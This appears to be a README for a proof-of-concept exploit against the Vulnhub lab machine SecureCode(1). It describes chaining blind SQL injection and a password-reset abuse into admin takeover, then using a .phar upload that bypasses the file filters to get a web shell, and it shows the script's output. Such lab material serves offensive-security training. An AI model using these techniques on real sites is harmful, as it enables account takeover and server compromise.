# Vulnhub Machine SecureCode(1) 
White Box Pentesting 

PoC exploit for OSWE-Like machine [ SecureCode(1) ] 

Author: sud0root

This is first PoC published for this VM! 

Machine URL : https://www.vulnhub.com/entry/securecode-1,651/


I have done this machine and write automation script to exploit two vulnerablities in this machine:

1- Authentication Bypass via Blind SQL injection that extract admin token, then abuse reset passord feature to login into admin account.
2- Remote code execution using File uplaod feature with bypassing Content-Type "Header Validation" and bypass extensions blacklist with .phar (PHP Archive extension). 

PoC : 
``
root@S1lv3r: python3 poc.py http://192.168.100.42

         [*] By SILVER [*]

Target URL -----> 192.168.100.42

[*] Extracting Database Name : 
 hackshop
[+] Database Name : hackshop
[+] Exploiting Blind SQLi and Extracting Admin Token : [+]
J9hnvviVy9cdMy1

[*] Admin Token : J9hnvviVy9cdMy1

[*] Reset Admin Password Done  =) 
[+] Successfully changing Admin password ! [+]

[*] Admin Cookie: sfa2kn28p7csafo3i5ihpvo3gh

[+] Successfully Login to Admin account [+]
[*] Uploading Shell Done! [*]
[*] Interactive shell ... 

$iLvEr > whoami
www-data

$iLvEr > echo "Thanks for Visit This Page"
Thanks for Visit This Page

$iLvEr > exit

         [*] Done =) [*]

root@S1lv3r:# 
``

         [*] Done =) [*]



